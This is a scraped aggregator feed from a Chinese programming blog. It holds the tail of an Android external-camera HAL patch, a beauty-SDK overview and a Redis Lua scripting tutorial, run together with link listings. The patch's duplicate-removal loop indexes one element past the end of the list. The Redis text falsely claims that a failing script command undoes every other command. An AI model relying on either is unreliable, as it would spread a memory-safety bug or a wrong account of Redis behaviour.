+std::vector&lt;int32_t&gt; streamConfigurations;std::vector&lt;int64_t&gt; minFrameDurations;std::vector&lt;int64_t&gt; stallDurations;for (const auto&amp; supportedFormat : mSupportedFormats) {
+#if 0
+        // wpzz add don't need skip now.if (supportedFormat.fourcc != fourcc) {// Skip 4CCs not meant for the halFormatscontinue;}
+#endiffor (const auto&amp; format : halFormats) {streamConfigurations.push_back(format);streamConfigurations.push_back(supportedFormat.width);
@@ -633,6 +643,13 @@ status_t ExternalCameraDevice::initOutputCharskeysByFormat(stallDurations.push_back(supportedFormat.height);stallDurations.push_back(stall_duration);}
+        ALOGV("supportedFormat:%c%c%c%c, w %d, h %d, minFrameDuration(%lld)",
+            supportedFormat.fourcc &amp; 0xFF,
+            (supportedFormat.fourcc &gt;&gt; 8) &amp; 0xFF,
+            (supportedFormat.fourcc &gt;&gt; 16) &amp; 0xFF,
+            (supportedFormat.fourcc &gt;&gt; 24) &amp; 0xFF,
+            supportedFormat.width, supportedFormat.height, minFrameDuration);
+}UPDATE(streamConfiguration, streamConfigurations.data(), streamConfigurations.size());
@@ -667,6 +684,8 @@ bool ExternalCameraDevice::calculateMinFps(fpsRanges.push_back(framerate);}minFps /= 2;
+    if (0 == minFps)
+        minFps = 1;int64_t maxFrameDuration = 1000000000LL / minFps;UPDATE(ANDROID_CONTROL_AE_AVAILABLE_TARGET_FPS_RANGES, fpsRanges.data(),
@@ -713,26 +732,24 @@ status_t ExternalCameraDevice::initOutputCharsKeys(}}-    if (hasDepth) {
-        initOutputCharskeysByFormat(metadata, V4L2_PIX_FMT_Z16, halDepthFormats,
-                ANDROID_DEPTH_AVAILABLE_DEPTH_STREAM_CONFIGURATIONS_OUTPUT,
-                ANDROID_DEPTH_AVAILABLE_DEPTH_STREAM_CONFIGURATIONS,
-                ANDROID_DEPTH_AVAILABLE_DEPTH_MIN_FRAME_DURATIONS,
-                ANDROID_DEPTH_AVAILABLE_DEPTH_STALL_DURATIONS);
-    }if (hasColor) {initOutputCharskeysByFormat(metadata, V4L2_PIX_FMT_MJPEG, halFormats,ANDROID_SCALER_AVAILABLE_STREAM_CONFIGURATIONS_OUTPUT,ANDROID_SCALER_AVAILABLE_STREAM_CONFIGURATIONS,ANDROID_SCALER_AVAILABLE_MIN_FRAME_DURATIONS,ANDROID_SCALER_AVAILABLE_STALL_DURATIONS);
-    }
-    if (hasColor_yuv) {
+    } else if (hasColor_yuv) {initOutputCharskeysByFormat(metadata, V4L2_PIX_FMT_YUYV, halFormats,ANDROID_SCALER_AVAILABLE_STREAM_CONFIGURATIONS_OUTPUT,ANDROID_SCALER_AVAILABLE_STREAM_CONFIGURATIONS,ANDROID_SCALER_AVAILABLE_MIN_FRAME_DURATIONS,ANDROID_SCALER_AVAILABLE_STALL_DURATIONS);
+    } else if (hasDepth) {
+        initOutputCharskeysByFormat(metadata, V4L2_PIX_FMT_Z16, halDepthFormats,
+                ANDROID_DEPTH_AVAILABLE_DEPTH_STREAM_CONFIGURATIONS_OUTPUT,
+                ANDROID_DEPTH_AVAILABLE_DEPTH_STREAM_CONFIGURATIONS,
+                ANDROID_DEPTH_AVAILABLE_DEPTH_MIN_FRAME_DURATIONS,
+                ANDROID_DEPTH_AVAILABLE_DEPTH_STALL_DURATIONS);}calculateMinFps(metadata);
@@ -765,7 +782,7 @@ status_t ExternalCameraDevice::initOutputCharsKeys(void ExternalCameraDevice::getFrameRateList(int fd, double fpsUpperBound, SupportedV4L2Format* format) {format-&gt;frameRates.clear();
-
+    format-&gt;maxFramerate = 1.0f;v4l2_frmivalenum frameInterval {.pixel_format = format-&gt;fourcc,.width = format-&gt;width,
@@ -773,6 +790,13 @@ void ExternalCameraDevice::getFrameRateList(.index = 0};+    ALOGV("format:%c%c%c%c, w %d, h %d, fpsUpperBound %f",
+        frameInterval.pixel_format &amp; 0xFF,
+        (frameInterval.pixel_format &gt;&gt; 8) &amp; 0xFF,
+        (frameInterval.pixel_format &gt;&gt; 16) &amp; 0xFF,
+        (frameInterval.pixel_format &gt;&gt; 24) &amp; 0xFF,
+        frameInterval.width, frameInterval.height, fpsUpperBound);
+for (frameInterval.index = 0;TEMP_FAILURE_RETRY(ioctl(fd, VIDIOC_ENUM_FRAMEINTERVALS, &amp;frameInterval)) == 0;++frameInterval.index) {
@@ -782,6 +806,9 @@ void ExternalCameraDevice::getFrameRateList(frameInterval.discrete.numerator,frameInterval.discrete.denominator};double framerate = fr.getDouble();
+                if (framerate &gt; format-&gt;maxFramerate) {
+                    format-&gt;maxFramerate = framerate;
+                }if (framerate &gt; fpsUpperBound) {continue;}
@@ -837,7 +864,7 @@ void ExternalCameraDevice::trimSupportedFormats(const auto&amp; maxSize = sortedFmts[sortedFmts.size() - 1];float maxSizeAr = ASPECT_RATIO(maxSize);
-
+#if 0        //该位置确认自己的camera调用的是哪一个接口// Remove formats that has aspect ratio not croppable from largest sizestd::vector&lt;SupportedV4L2Format&gt; out;for (const auto&amp; fmt : sortedFmts) {
@@ -855,6 +882,15 @@ void ExternalCameraDevice::trimSupportedFormats(maxSize.width, maxSize.height);}}
+#else
+    std::vector&lt;SupportedV4L2Format&gt; out;
+        //all enum format added to SupportedFormat
+    ALOGD("%s(%d): don't care ratio of horizontally or vertical "，__FUNCTION__, __LINE__);
+
+    for (const auto&amp; fmt : sortedFmts) {
+        out.push_back(fmt);
+    }
+#endifsortedFmts = out;}@@ -1007,6 +1043,23 @@ void ExternalCameraDevice::initSupportedFormatsLocked(int fd) {mCroppingType = VERTICAL;}}
+    /* mSupportedFormats has been sorted by size
+       remove the same size format */
+    std::vector&lt;SupportedV4L2Format&gt; tmp;
+    for (int i = 0; i &lt; mSupportedFormats.size(); ) {
+        if ((mSupportedFormats[i+1].width == mSupportedFormats[i].width) &amp;&amp;
+            (mSupportedFormats[i+1].height == mSupportedFormats[i].height)) {
+                if (mSupportedFormats[i+1].maxFramerate &gt; mSupportedFormats[i].maxFramerate)
+                    tmp.push_back(mSupportedFormats[i+1]);
+                else
+                    tmp.push_back(mSupportedFormats[i]);
+                i = i + 2;
+         } else {
+            tmp.push_back(mSupportedFormats[i]);
+            i++;
+         }
+    }
+    mSupportedFormats = tmp;}sp&lt;ExternalCameraDeviceSession&gt; ExternalCameraDevice::createSession(diff --git a/camera/device/3.4/default/ExternalCameraUtils.cpp b/camera/device/3.4/default/ExternalCameraUtils.cpp
old mode 100644
new mode 100755
diff --git a/camera/device/3.4/default/include/ext_device_v3_4_impl/ExternalCameraUtils.h b/camera/device/3.4/default/include/ext_device_v3_4_impl/ExternalCameraUtils.h
old mode 100644
new mode 100755
index 341c62218..669a2bf68
--- a/camera/device/3.4/default/include/ext_device_v3_4_impl/ExternalCameraUtils.h
+++ b/camera/device/3.4/default/include/ext_device_v3_4_impl/ExternalCameraUtils.h
@@ -110,6 +110,7 @@ struct SupportedV4L2Format {uint32_t durationDenominator; // frame duration denominator. Ex: 30double getDouble() const;     // FrameRate in double.        Ex: 30.0};
+    double maxFramerate;    //该补丁若代码中无对应的地方，可修改同级文件ExternalCameraUtils_3.4.h 的相应位置是一样的std::vector&lt;FrameRate&gt; frameRates;};-- 
2.17.1此外，修改分辨率问题也可参考如下：//显示更多拍照分辨率的 改应用代码里这个地方。private static List&lt;Size&gt; pickUpToThree(List&lt;Size&gt; sizes) {List&lt;Size&gt; result = new ArrayList&lt;Size&gt;();Size largest = sizes.get(0);if (largest.width() != 1920 || largest.height() != 1088)result.add(largest);Size lastSize = largest;for (Size size : sizes) {if (size != null &amp;&amp; size.width() == 1920 &amp;&amp; size.height() == 1088)continue;+            result.add(size);-            double targetArea = Math.pow(.5, result.size()) * area(largest);+            /*double targetArea = Math.pow(.5, result.size()) * area(largest);if (area(size) &lt; targetArea) {// This candidate is smaller than half the mega pixels of the// last one. Let's see whether the previous size, or this size// is closer to the desired target.if (!result.contains(lastSize)&amp;&amp; (targetArea - area(lastSize) &lt; area(size) - targetArea)) {result.add(lastSize);} else {result.add(size);}}lastSize = size;if (result.size() == 3) {break;}}// If we have less than three, we can add the smallest size.if (result.size() &lt; 3 &amp;&amp; !result.contains(lastSize)) {result.add(lastSize);-        }+        }*/return result;}http://www.ppmy.cn/news/1540374.html相关文章视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解视频美颜SDK作为一种技术解决方案&amp;#xff0c;已经广泛应用于各类直播平台中&amp;#xff0c;实现了实时美颜效果的优化。那么&amp;#xff0c;视频美颜SDK是如何与直播平台融合&amp;#xff0c;打造高效的实时美颜效果的&amp;#xff1f;本文将对此技术方案进行详细解析。 
一、视频美颜SDK的核…阅读更多...滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:15 +0000</pubDate>
    </item>
    <item>
      <title>视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解</title>
      <link>https://www.ppmy.cn/news/1540372.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维视频美颜SDK与直播平台的融合：实现实时美颜的技术方案详解news/2025/10/31 17:53:13/视频美颜SDK作为一种技术解决方案，已经广泛应用于各类直播平台中，实现了实时美颜效果的优化。那么，视频美颜SDK是如何与直播平台融合，打造高效的实时美颜效果的？本文将对此技术方案进行详细解析。一、视频美颜SDK的核心功能视频美颜SDK是一套集成于应用程序中的开发工具，主要提供实时美颜、磨皮、瘦脸、祛斑等功能，帮助用户在视频通话或直播过程中实现视觉效果的提升。其核心功能包括：1.实时人脸识别与跟踪：基于AI算法，视频美颜SDK能够精准识别人脸的关键特征点，如眼睛、鼻子、嘴巴等，并进行动态跟踪。这种能力为后续的美颜处理提供了基础支持。2.实时图像处理：在识别出人脸的基础上，SDK可以进行多种美颜效果的叠加处理，如磨皮美白、祛斑祛痘、瘦脸、增强五官轮廓等，确保用户在动态视频中的每一帧都能保持最佳状态。3.高效视频编码优化：视频美颜SDK在进行美颜处理的同时，还能确保视频的实时编码质量，避免因处理复杂度过高而导致的延迟或卡顿问题。二、视频美颜SDK与直播平台的技术融合要将视频美颜SDK顺利集成到直播平台中，实现无缝的实时美颜效果，需要经过几个关键的技术步骤：1.视频流处理：在直播平台中，视频美颜SDK需要对直播视频流进行实时处理。这意味着SDK必须在视频采集、编码和推流的过程中，对每一帧视频进行美颜处理。为了保证美颜效果的流畅度，SDK通常会采用GPU加速技术，使得处理速度与视频的帧率保持一致。2.视频采集与编码的优化：在直播平台中，美颜效果的实现依赖于高效的视频采集与编码。美颜SDK与直播平台的融合，要求对视频采集设备进行优化，确保摄像头能够捕捉到足够的清晰度与细节。同时，编码器要能够高效压缩美颜后的视频流，减少带宽消耗，保证直播画面的清晰与流畅。3.多平台兼容性：直播平台通常需要支持多种设备和操作系统，如iOS、Android、Windows等。因此，视频美颜SDK必须具备良好的跨平台兼容性，以便在不同设备上都能提供一致的美颜效果。通过灵活的API接口，开发者可以快速将SDK集成到现有的直播系统中，并根据不同平台的硬件性能进行优化调整。4.延迟控制与帧率优化：在直播场景中，低延迟和高帧率是保证观众体验的关键。因此，视频美颜SDK在处理时，必须控制美颜效果的计算延迟，确保主播与观众的互动能够实时进行。同时，SDK需要对处理过程进行优化，使其对帧率的影响降到最低，避免因美颜处理而造成画面卡顿。三、实时美颜的技术挑战与优化尽管视频美颜SDK的应用已经相对成熟，但在实际使用过程中仍然面临一些技术挑战。以下是几项常见的难题及优化方案：1.高动态场景中的美颜稳定性：在直播过程中，主播的面部表情变化、灯光效果以及摄像机的移动，都会影响美颜效果的稳定性。为此，SDK需要配备先进的AI算法，实时调整美颜效果，确保在不同的动态场景下都能保持自然的视觉表现。2.低带宽下的美颜效果：在带宽受限的网络环境中，传输美颜后的高清视频流可能会面临较大的压力。为解决这一问题，SDK可以采用智能压缩技术，减少图像数据的传输量，同时对美颜效果进行适当的权衡，确保画面流畅性优先。3.个性化美颜参数的调节：不同用户对美颜效果的需求有所不同，因此SDK需要提供丰富的参数调节选项，如磨皮强度、肤色调整、五官增强等，允许用户根据自身的喜好进行自定义设置。总结：视频美颜SDK的出现，为直播平台提供了强大的技术支持，使得主播能够在直播过程中展现出最佳状态。通过高效的图像处理、低延迟的实时优化和多平台的兼容性，视频美颜SDK为用户带来了前所未有的直播体验。http://www.ppmy.cn/news/1540372.html相关文章滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧全文目录&amp;#xff1a; &amp;#x1f4dd;前言&amp;#x1f6a6;正文&amp;#x1f31f;6.2.1 Lua脚本的优势&amp;#x1f58b;️6.2.2 EVAL命令与Lua脚本编写&amp;#x1f435;编写Lua脚本的基本步骤&amp;#x1f436;示例&amp;#xff1a;简单的GET和SET操作&amp;#x1f431;示例&amp;#xff1a;Lua实现自增和过期…阅读更多...FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:13 +0000</pubDate>
    </item>
    <item>
      <title>滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧</title>
      <link>https://www.ppmy.cn/news/1540371.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维滚雪球学Redis[6.2讲]：Redis脚本与Lua：深入掌握Redis中的高效编程技巧news/2025/10/31 17:53:12/全文目录：📝前言🚦正文🌟6.2.1 Lua脚本的优势🖋️6.2.2 EVAL命令与Lua脚本编写🐵编写Lua脚本的基本步骤🐶示例：简单的GET和SET操作🐱示例：Lua实现自增和过期时间🧨6.2.3 Lua脚本的安全性与性能优化🐯安全性问题🦊性能优化🎮️过渡展望：Redis分布式锁⚡总结📝前言在上期内容【6.1 Redis事务】中，我们探讨了Redis中的事务机制，尤其是如何通过MULTI、EXEC和WATCH命令来确保数据的一致性。尽管Redis的事务功能为多个命令提供了原子性，但在处理复杂的业务逻辑时，这种方式常常显得力不从心。为了应对这一挑战，Redis引入了Lua脚本功能，使得开发者可以在Redis中编写更加复杂的操作逻辑，提升了灵活性和效率。本期内容【6.2 Redis脚本与Lua】将着重介绍使用Lua脚本的优势、如何编写和执行Lua脚本、以及脚本的安全性和性能优化。通过具体的案例，读者可以更直观地理解Lua脚本在实际应用中的强大功能。此外，在下期内容【6.3 Redis分布式锁】中，我们将深入探讨如何利用Redis实现分布式锁机制，确保在分布式环境下的数据一致性与同步，敬请期待！🔐🚦正文🌟6.2.1 Lua脚本的优势在Redis中使用Lua脚本有几个显著的优势，能够有效提升应用程序的性能和灵活性：减少网络开销Redis是一个基于请求/响应模型的系统。每次请求都需要经过网络往返，这在处理多个命令时尤其影响性能。通过Lua脚本，开发者可以将多个命令组合到一个脚本中，这样可以显著减少网络延迟，从而提升整体性能。示例：-- 假设需要对多个键执行操作localvalue1=redis.call('GET',KEYS[1])localvalue2=redis.call('GET',KEYS[2])returnvalue1+value2在没有Lua脚本的情况下，客户端需要发送两次请求，而使用Lua脚本只需发送一次请求即可。操作的原子性使用Lua脚本可以确保脚本中的所有操作都以原子方式执行。这意味着，如果脚本中的任何一个命令失败，Redis会保证没有任何命令被执行。这对于保持数据一致性至关重要。支持复杂逻辑Lua是一种功能强大的编程语言，支持条件判断、循环和函数等结构。开发者可以使用Lua编写复杂的逻辑，从而减少客户端代码的复杂性。示例：-- 使用Lua实现条件逻辑localcount=redis.call('GET',KEYS[1])ifcountandtonumber(count)&gt;10thenreturn'超过限制'elseredis.call('INCR',KEYS[1])return'已增加计数'end🖋️6.2.2 EVAL命令与Lua脚本编写Redis使用EVAL命令来执行Lua脚本。其基本语法如下：EVAL script numkeys key[key...]arg[arg...]script：Lua脚本内容numkeys：传入的key数量key：要操作的Redis键arg：脚本中的参数🐵编写Lua脚本的基本步骤加载脚本将Lua脚本加载到Redis中，通常通过EVAL命令直接执行。编写脚本根据业务逻辑编写Lua脚本，可以使用Redis的各种命令。执行脚本使用EVAL或EVALSHA命令来执行脚本。🐶示例：简单的GET和SET操作-- Lua脚本示例：从Redis获取值，如果不存在则设置默认值localvalue=redis.call('GET',KEYS[1])-- 获取key对应的值ifnotvaluethenredis.call('SET',KEYS[1],ARGV[1])-- 如果key不存在，设置默认值value=ARGV[1]endreturnvalue执行方式：EVAL"local value = redis.call('GET', KEYS[1]); if not value then redis.call('SET', KEYS[1], ARGV[1]); value = ARGV[1]; end; return value"1mykey"default_value"在这个示例中，Lua脚本尝试获取键的值，如果键不存在，则设置默认值。🐱示例：Lua实现自增和过期时间-- Lua脚本示例：对某个键进行自增操作，并设置过期时间localcurrent=redis.call('INCR',KEYS[1])ifcurrent==1thenredis.call('EXPIRE',KEYS[1],ARGV[1])-- 只有在键第一次自增时，设置过期时间endreturncurrent执行方式：EVAL"local current = redis.call('INCR', KEYS[1]); if current == 1 then redis.call('EXPIRE', KEYS[1], ARGV[1]); end; return current"1mycounter60在这个示例中，Lua脚本对mycounter键进行自增操作，并在第一次自增时设置过期时间为60秒。🧨6.2.3 Lua脚本的安全性与性能优化🐯安全性问题脚本注入Lua脚本也可能遭遇脚本注入问题，尤其是在处理用户输入时。为了避免这种情况，应该尽量使用KEYS和ARGV参数传递用户输入，而不是直接嵌入到脚本中。防止注入示例：-- 不安全的方式，可能引发脚本注入localuser_input=ARGV[1]localunsafe_script="redis.call('SET', 'user:"..user_input.."', 'value')"-- 安全的方式，使用ARGV传递redis.call('SET',KEYS[1],ARGV[1])脚本超时Redis提供了一个配置选项lua-time-limit，用于限制Lua脚本的执行时间。若脚本超过此时间，Redis会强行终止。CONFIG SET lua-time-limit10000# 设置Lua脚本执行时间限制为10秒🦊性能优化缓存脚本Redis会为每个Lua脚本进行编译。为了提升性能，可以使用EVALSHA命令执行脚本的SHA1摘要，从而避免重复编译。示例：localsha1=redis.call('SCRIPT','LOAD',"your_lua_script")然后使用EVALSHA命令执行：EVALSHA sha1 numkeys key[key...]arg[arg...]减少内部Redis命令调用在编写Lua脚本时，应尽量减少redis.call的调用次数。虽然每次调用都在Redis内部执行，但仍会引入开销。合并逻辑或通过批量操作提升执行效率。示例：-- 合并多个命令为一个逻辑localvalue1=redis.call('GET',KEYS[1])localvalue2=redis.call('GET',KEYS[2])returnvalue1+value2-- 只需一次返回🎮️过渡展望：Redis分布式锁在下一期【6.3 Redis分布式锁】中，我们将深入探讨如何利用Redis实现分布式锁。这在分布式系统中具有重要意义，可以确保多个节点之间的数据一致性和同步。我们将详细讲解分布式锁的实现原理、常见的实现方式（如SETNX、Redlock等），以及如何避免锁的死锁问题。通过这些知识，你将能够更有效地管理分布式环境中的资源，确保系统的高可用性和稳定性。下期亮点：深入了解分布式锁的工作原理实现锁的获取与释放优化分布式锁的性能与安全性敬请期待！🎯⚡总结Redis中的Lua脚本为开发者提供了强大的编程能力，能够简化多命令操作，确保操作的原子性和执行效率。通过合理编写和优化Lua脚本，开发者可以大幅提升Redis的性能，减少网络通信开销。在实际项目中，Lua脚本的使用不仅提升了代码的可读性和可维护性，还能在复杂业务逻辑的实现上展现其独特优势。希望本期内容能帮助你更深入地理解和运用Redis脚本与Lua，为你的开发工作带来便利。如果你有任何问题或讨论，欢迎在评论区分享！✨http://www.ppmy.cn/news/1540371.html相关文章FFMPEG录屏（19）--- 枚举Windows下的屏幕列表，并获取名称、缩略图在Windows下枚举显示器列表并获取名称、缩略图 
在Windows系统中&amp;#xff0c;枚举显示器列表并获取它们的名称和缩略图是一个常见的需求。本文将详细介绍如何实现这一功能&amp;#xff0c;涉及到的主要技术包括Windows API和C编程。 
获取显示器信息 
首先&amp;#xff0c;我们需要一个…阅读更多...【升华】python基础包NumPy学习NumPy是使用Python进行科学计算的基础软件包。除其他外&amp;#xff0c;它包括&amp;#xff1a; 
功能强大的N维数组对象。精密广播功能函数。集成 C/C和Fortran 代码的工具。强大的线性代数、傅立叶变换和随机数功能。 
# 1、安装包
$ pip install numpy# 2、进入python的交互式界面
$…阅读更多...FFmpeg 4.3 音视频-多路H265监控录放C++开发四 ：RGB颜色一  RGB 的意义&amp;#xff1f; 为什么要从RGB 开始讲起呢&amp;#xff1f; 
因为最终传输到显卡显示器的颜色都是RGB 
即使能处理YUV的API&amp;#xff0c;本质上也是帮你做了从 YUV 到 RGB的转换。 RGB888 表示 R 占8bit&amp;#xff0c;G 占8bit&amp;#xff0c;B 占8bit&amp;#xff0c;也就是每一…阅读更多...解锁A/B测试：如何用数据驱动的实验提升你的网站和应用来源&amp;#xff1a;Gallo, A. (2017, June 28). A refresher on A/B testing. Harvard Business Review. https://hbr.org/2017/06/a-refresher-on-ab-testing 
在数字化时代&amp;#xff0c;我们每天都在被大量的信息和广告轰炸。那么&amp;#xff0c;如何让你的网站或应用脱颖而出&amp;…阅读更多...通信工程学习：什么是VPN虚拟私人网络VPN&amp;#xff1a;虚拟私人网络 VPN&amp;#xff0c;即虚拟私人网络&amp;#xff08;Virtual Private Network&amp;#xff09;&amp;#xff0c;是一种通过公共网络&amp;#xff08;如互联网&amp;#xff09;建立的加密连接&amp;#xff0c;用于保护用户的网络连接和数据传输的安全与隐私。以下是关于VPN的详细…阅读更多...QGroundControl最新版本MacOS平台编译(使用CMakeLists.txt)1.下载源码: 
git clone https://github.com/mavlink/qgroundcontrol.git --recursive 2.安装依赖： 
brew install GStreamer 设置环境变量：GST_PLUGIN_PATH 安装SDL2: 
brew install SDL2阅读更多...Qt 自绘开关按钮以及设计器中的提升为用法文章目录 自绘按钮实现概要效果图代码 提升为用法介绍步骤 总结 自绘按钮实现 
概要 
当我们需要一个开关样式的QPushbutton&amp;#xff0c;没有图片的话&amp;#xff0c;我们可以采用自绘的形式实现。且使用QtDesinger中提升为Promote to的功能加入界面中&amp;#xff0c;而不是使用代码的…阅读更多...流体力学笔记目录 1、名词2、湍流与涡流3 涡激振动4 压力面与吸力面参考&amp;#xff1a;[空气动力学的“他山之石”](https://zhuanlan.zhihu.com/p/412542513) 1、名词 
